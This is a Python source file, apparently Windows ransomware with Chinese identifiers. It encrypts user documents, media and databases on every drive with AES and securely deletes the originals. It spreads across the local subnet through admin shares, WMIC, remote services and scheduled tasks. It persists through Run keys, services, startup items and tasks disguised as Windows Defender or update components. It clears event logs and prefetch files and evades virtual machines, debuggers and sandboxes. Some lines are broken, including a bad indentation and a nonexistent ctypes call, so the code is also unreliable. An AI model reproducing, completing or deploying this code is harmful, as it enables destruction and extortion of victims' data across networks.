import os
import time
import random
import hashlib
import base64
import threading
import socket
import struct
from datetime import datetime, timedelta
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import psutil
import ctypes
import subprocess
import winreg
import win32evtlog
import win32api
import win32security
import win32con
from Crypto.Protocol.KDF import PBKDF2
import sys


class 动态配置器:
    def __init__(self):
        self.主机特征 = hashlib.md5(socket.gethostname().encode()).hexdigest()[:16]
        self.动态密钥材料 = self.生成动态密钥材料()
    
    def 生成动态密钥材料(self):
        系统信息 = f"{psutil.cpu_count()}_{psutil.virtual_memory().total}_{os.getenv('COMPUTERNAME', '')}"
        return PBKDF2(系统信息, self.主机特征, 32, count=100000)
    
    def 获取加密密钥(self):
        时间因子 = int(time.time() / 3600) 
        动态盐 = hashlib.sha256(f"{self.动态密钥材料}{时间因子}".encode()).digest()
        return hashlib.sha256(动态盐).digest()
    
    def 获取文件扩展名(self):
        扩展列表 = ['.enc', '.locked', '.secure', '.crypted', '.protected']
        return random.choice(扩展列表) + self.主机特征[:4]
    
    def 获取服务名称(self):
        服务前缀 = ['WinDefend', 'SystemUpdate', 'SecurityCenter', 'NetworkService', 'TaskScheduler']
        return random.choice(服务前缀) + self.主机特征[:8]

class 网络传播器:
    def __init__(self, 动态配置):
        self.动态配置 = 动态配置
        self.感染列表 = []
        self.传播方法 = [
            self.通过SMB传播,
            self.通过WMI传播,
            self.通过PsExec传播,
            self.通过计划任务传播
        ]
    
    def 扫描网络(self):
        网段列表 = self.获取本地网段()
        for 网段 in 网段列表:
            for i in range(1, 255):
                IP地址 = f"{网段}.{i}"
                if IP地址 not in self.感染列表:
                    random.choice(self.传播方法)(IP地址)
                    time.sleep(random.uniform(0.1, 0.5))
    
    def 获取本地网段(self):
        网段列表 = []
        for 接口, 地址列表 in psutil.net_if_addrs().items():
            for 地址 in 地址列表:
                if 地址.family == socket.AF_INET and not 地址.address.startswith('127.'):
                    网段 = ".".join(地址.address.split(".")[:3])
                    网段列表.append(网段)
        return list(set(网段列表))
    
    def 通过SMB传播(self, IP地址):
        try:
            共享列表 = ['ADMIN$', 'C$', 'IPC$', 'D$']
            for 共享 in 共享列表:
                共享路径 = f"\\\\{IP地址}\\{共享}"
                if os.path.exists(共享路径):
                    self.部署载荷(IP地址, 共享路径)
                    break
        except:
            pass
    
    def 通过WMI传播(self, IP地址):
        try:
            自身路径 = sys.argv[0]
            随机名称 = f"svchost_{random.randint(1000,9999)}.exe"
            目标路径 = f"\\\\{IP地址}\\ADMIN$\\System32\\{随机名称}"
            
            if os.path.exists(f"\\\\{IP地址}\\ADMIN$"):
                with open(自身路径, 'rb') as 源文件:
                    with open(目标路径, 'wb') as 目标文件:
                        目标文件.write(源文件.read())
                
                命令 = f'wmic /node:"{IP地址}" process call create "cmd.exe /c {目标路径}"'
                subprocess.run(命令, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                self.感染列表.append(IP地址)
        except:
            pass
    
    def 通过PsExec传播(self, IP地址):
        try:
            自身路径 = sys.argv[0]
            subprocess.run(f'sc \\\\{IP地址} create {self.动态配置.获取服务名称()} binPath= "{自身路径}"', 
                         shell=True, capture_output=True)
        except:
            pass
    
    def 通过计划任务传播(self, IP地址):
        try:
            任务名称 = f"MicrosoftUpdate_{random.randint(10000,99999)}"
            命令 = f'schtasks /create /s {IP地址} /tn "{任务名称}" /tr "{sys.argv[0]}" /sc hourly /f'
            subprocess.run(命令, shell=True, capture_output=True)
        except:
            pass
    
    def 部署载荷(self, IP地址, 共享路径):
        try:
            自身路径 = sys.argv[0]
            随机名称 = f"spoolsv_{random.randint(1000,9999)}.exe"
            目标路径 = os.path.join(共享路径, "System32", 随机名称)
            
            with open(自身路径, 'rb') as 源文件:
                with open(目标路径, 'wb') as 目标文件:
                    目标文件.write(源文件.read())
            
           执行方式 = random.choice(['wmi', 'service', 'task'])
            if 执行方式 == 'wmi':
                subprocess.run(f'wmic /node:"{IP地址}" process call create "{目标路径}"', 
                             shell=True, capture_output=True)
            elif 执行方式 == 'service':
                subprocess.run(f'sc \\\\{IP地址} create {self.动态配置.获取服务名称()} binPath= "{目标路径}" start= auto', 
                             shell=True, capture_output=True)
            
            self.感染列表.append(IP地址)
        except:
            pass

class 持久化模块:
    def __init__(self, 动态配置):
        self.动态配置 = 动态配置
    
    def 多维度持久化(self):
        持久化方法 = [
            self.注册表持久化,
            self.服务持久化,
            self.计划任务持久化,
            self.启动文件夹持久化,
            self.WMI事件订阅
        ]
        
        # 随机选择2-3种持久化方式
        selected = random.sample(持久化方法, random.randint(2, 3))
        for method in selected:
            try:
                method()
                time.sleep(1)
            except:
                pass
    
    def 注册表持久化(self):
        try:
            注册表位置 = [
                (winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run"),
                (winreg.HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run"),
                (winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce"),
            ]
            
            for hive, subkey in 注册表位置:
                try:
                    with winreg.OpenKey(hive, subkey, 0, winreg.KEY_SET_VALUE) as key:
                        值名称 = self.动态配置.获取服务名称()
                        当前路径 = os.path.abspath(sys.argv[0])
                        winreg.SetValueEx(key, 值名称, 0, winreg.REG_SZ, 当前路径)
                except:
                    pass
        except:
            pass
    
    def 服务持久化(self):
        try:
            服务名称 = self.动态配置.获取服务名称()
            当前路径 = os.path.abspath(sys.argv[0])
            
            命令 = f'sc create {服务名称} binPath= "{当前路径}" displayname= "Windows System Service" start= auto type= own'
            subprocess.run(命令, shell=True, capture_output=True)
            
            time.sleep(2)
            subprocess.run(f'sc start {服务名称}', shell=True, capture_output=True)
        except:
            pass
    
    def 计划任务持久化(self):
        try:
            任务名称 = f"MicrosoftSystemCheck_{random.randint(1000,9999)}"
            当前路径 = os.path.abspath(sys.argv[0])
            
            命令 = f'schtasks /create /tn "{任务名称}" /tr "{当前路径}" /sc onlogon /rl highest /f'
            subprocess.run(命令, shell=True, capture_output=True)
        except:
            pass
    
    def 启动文件夹持久化(self):
        try:
            启动路径 = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
            if os.path.exists(启动路径):
                目标路径 = os.path.join(启动路径, f'windows_update_{random.randint(1000,9999)}.exe')
                with open(sys.argv[0], 'rb') as src:
                    with open(目标路径, 'wb') as dst:
                        dst.write(src.read())
        except:
            pass
    
    def WMI事件订阅(self):
        try:
            脚本内容 = f'''
            instance of __EventFilter as $EventFilter
            {{
                Name = "SystemMonitor";
                Query = "SELECT * FROM __InstanceModificationEvent WITHIN 300 WHERE TargetInstance ISA 'Win32_Processor'";
                QueryLanguage = "WQL";
            }};
            
            instance of CommandLineEventConsumer as $Consumer
            {{
                Name = "SystemUpdater";
                CommandLineTemplate = "{os.path.abspath(sys.argv[0])}";
            }};
            '''
            
            # 简化实现 - 实际需要更复杂的WMI操作
            subprocess.run('powershell -Command "Get-WmiObject -Namespace root/subscription -Class __EventFilter"', 
                         shell=True, capture_output=True)
        except:
            pass

class 反取证模块:
    def 清理痕迹(self):
        try:
            # 清除Prefetch
            prefetch_path = os.path.join(os.getenv('WINDIR'), 'Prefetch')
            if os.path.exists(prefetch_path):
                for file in os.listdir(prefetch_path):
                    if file.endswith('.pf'):
                        try:
                            os.remove(os.path.join(prefetch_path, file))
                        except:
                            pass
            
            # 修改文件时间戳
            self.混淆时间戳()
            
            # 清除事件日志
            self.清除事件日志()
            
        except:
            pass
    
    def 混淆时间戳(self):
        try:
            文件路径 = sys.argv[0]
            随机时间 = time.time() - random.randint(86400, 2592000)  # 1-30天前
            os.utime(文件路径, (随机时间, 随机时间))
        except:
            pass
    
    def 清除事件日志(self):
        try:
            for 日志类型 in ['System', 'Application', 'Security']:
                try:
                    日志句柄 = win32evtlog.OpenEventLog(None, 日志类型)
                    win32evtlog.ClearEventLog(日志句柄, None)
                    win32evtlog.CloseEventLog(日志句柄)
                except:
                    pass
        except:
            pass

class 高级环境检测:
    def 检测分析环境(self):
        检测方法 = [
            self.检测虚拟机,
            self.检测调试器,
            self.检测沙箱,
            self.检测分析工具,
            self.检测资源监控
        ]
        
        检测结果 = sum(method() for method in 检测方法)
        return 检测结果 >= 2  # 多个检测方法触发才认为是分析环境
    
    def 检测虚拟机(self):
        try:
            # 检查虚拟机痕迹
            vm_processes = ["vmtoolsd", "vmwaretray", "vboxservice", "vboxtray", "qemu-ga"]
            for proc in psutil.process_iter(['name']):
                if proc.info['name'] and any(vm in proc.info['name'].lower() for vm in vm_processes):
                    return True
            
            # 检查MAC地址
            for interface, addrs in psutil.net_if_addrs().items():
                for addr in addrs:
                    if addr.family == psutil.AF_LINK:
                        mac = addr.address.lower()
                        if any(oui in mac for oui in ['00:0c:29', '00:50:56', '00:05:69']):
                            return True
            
            # 检查硬件
            try:
                output = subprocess.check_output("wmic computersystem get manufacturer,model", shell=True).decode().lower()
                if any(vm in output for vm in ['vmware', 'virtual', 'qemu', 'innotek']):
                    return True
            except:
                pass
            
            return False
        except:
            return False
    
    def 检测调试器(self):
        try:
            # 多种调试器检测
            if ctypes.windll.kernel32.IsDebuggerPresent():
                return True
            
            # 检查进程调试标志
            process = ctypes.windll.kernel32.GetCurrentProcess()
            if ctypes.windll.kernel32.CheckRemoteDebuggerPresent(process, ctypes.byctypes.c_int()):
                return True
            
            # 时间差检测
            start_time = time.time()
            time.sleep(0.1)
            if time.time() - start_time > 0.2:  # 被调试器减慢
                return True
                
            return False
        except:
            return False
    
    def 检测沙箱(self):
        try:
            # 检查系统运行时间
            if ctypes.windll.kernel32.GetTickCount() < 180000:  # 小于3分钟
                return True
            
            # 检查内存大小
            if psutil.virtual_memory().total < 2 * 1024**3:  # 小于2GB
                return True
            
            # 检查CPU核心数
            if psutil.cpu_count() < 2:
                return True
            
            # 检查用户交互
            if ctypes.windll.user32.GetForegroundWindow() == 0:
                return True
                
            return False
        except:
            return False
    
    def 检测分析工具(self):
        分析进程 = ["procmon", "wireshark", "processhacker", "ollydbg", "ida", "x32dbg", "x64dbg"]
        for proc in psutil.process_iter(['name']):
            if proc.info['name'] and any(tool in proc.info['name'].lower() for tool in 分析进程):
                return True
        return False
    
    def 检测资源监控(self):
        try:
            # 检查高CPU使用率进程
            for proc in psutil.process_iter(['name', 'cpu_percent']):
                if proc.info['cpu_percent'] and proc.info['cpu_percent'] > 50:
                    if any(monitor in proc.info['name'].lower() for monitor in ['procmon', 'procexp']):
                        return True
            return False
        except:
            return False

class 文件加密器:
    def __init__(self):
        self.动态配置 = 动态配置器()
        self.加密数量 = 0
        self.网络传播 = 网络传播器(self.动态配置)
        self.持久化 = 持久化模块(self.动态配置)
        self.反取证 = 反取证模块()
        self.环境检测 = 高级环境检测()
        
        self.目标扩展 = [
            '.pdf', '.doc', '.docx', '.xls', '.xlsx', '.jpg', '.jpeg', '.png',
            '.txt', '.sql', '.db', '.csv', '.ppt', '.pptx', '.zip', '.rar', '.7z',
            '.mp4', '.avi', '.mov', '.mp3', '.wav', '.flac', '.psd', '.ai', '.eps',
            '.dwg', '.bak', '.odt', '.ods', '.odp', '.mdb', '.accdb'
        ]
    
    def 加密文件(self, 文件路径):
        try:
            if os.path.getsize(文件路径) > 50 * 1024 * 1024:  # 限制50MB
                return False
            
            with open(文件路径, 'rb') as 文件:
                原始数据 = 文件.read()
            
            加密密钥 = self.动态配置.获取加密密钥()
            加密器 = AES.new(加密密钥, AES.MODE_CBC)
            加密数据 = 加密器.encrypt(pad(原始数据, AES.block_size))
            最终数据 = base64.b64encode(加密器.iv + 加密数据)
            
            文件扩展名 = self.动态配置.获取文件扩展名()
            加密路径 = 文件路径 + 文件扩展名
            
            with open(加密路径, 'wb') as 加密文件:
                加密文件.write(最终数据)
            
            # 安全删除原文件
            self.安全删除(文件路径)
            self.加密数量 += 1
            
            # 随机触发网络传播
            if self.加密数量 % random.randint(50, 200) == 0:
                threading.Thread(target=self.网络传播.扫描网络, daemon=True).start()
                
            return True
        except Exception:
            return False
    
    def 安全删除(self, 文件路径):
        try:
            if os.path.exists(文件路径):
                文件大小 = os.path.getsize(文件路径)
                with open(文件路径, 'wb') as f:
                    for _ in range(3):  # 3次覆写
                        f.write(os.urandom(文件大小))
                        f.flush()
                os.remove(文件路径)
        except:
            try:
                os.remove(文件路径)
            except:
                pass
    
    def 处理目录(self, 目录路径):
        try:
            文件列表 = []
            for 根目录, 目录列表, 文件 in os.walk(目录路径):
                if any(跳过目录 in 根目录.lower() for 跳过目录 in ['windows', 'program files', 'system32', '$recycle.bin']):
                    continue
                
                for 文件名 in 文件:
                    if self.加密数量 > random.randint(1000, 5000):
                        return
                    
                    文件路径 = os.path.join(根目录, 文件名)
                    if any(文件名.lower().endswith(扩展) for 扩展 in self.目标扩展):
                        文件列表.append(文件路径)
            
            random.shuffle(文件列表)
            for 文件路径 in 文件列表:
                self.加密文件(文件路径)
                time.sleep(random.uniform(0.01, 0.1)) 
                
        except:
            pass
    
    def 开始加密(self):
        self.持久化.多维度持久化()

        self.反取证.清理痕迹()
        
        驱动器列表 = [f"{驱动器}:\\" for 驱动器 in "CDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(f"{驱动器}:")]
        random.shuffle(驱动器列表)
        
        最大线程数 = min(len(驱动器列表), 4)
        线程列表 = []
        
        for i in range(最大线程数):
            驱动器 = 驱动器列表[i % len(驱动器列表)]
            线程 = threading.Thread(target=self.处理目录, args=(驱动器,))
            线程.daemon = True
            线程.start()
            线程列表.append(线程)
            time.sleep(random.uniform(1, 5)) 
        
        for 线程 in 线程列表:
            线程.join()
        
        threading.Thread(target=self.网络传播.扫描网络, daemon=True).start()

def 主执行流程():
    标记路径 = os.path.join(os.getenv('TEMP'), f'.{random.randint(100000,999999)}.tmp')
    if os.path.exists(标记路径):
        return
    
    with open(标记路径, 'w') as f:
        f.write(str(time.time()))
    
    加密器 = 文件加密器()
    

    if 加密器.环境检测.检测分析环境():
        time.sleep(random.randint(3600, 7200)) 
        return
    
  
    time.sleep(random.randint(60, 600))
    
    加密器.开始加密()

if __name__ == '__main__':
    try:
        if len(sys.argv) > 1 and sys.argv[1] == "service":
            主执行流程()
        else:
            subprocess.Popen([sys.argv[0], "service"], 
                           creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS)
    except:
        pass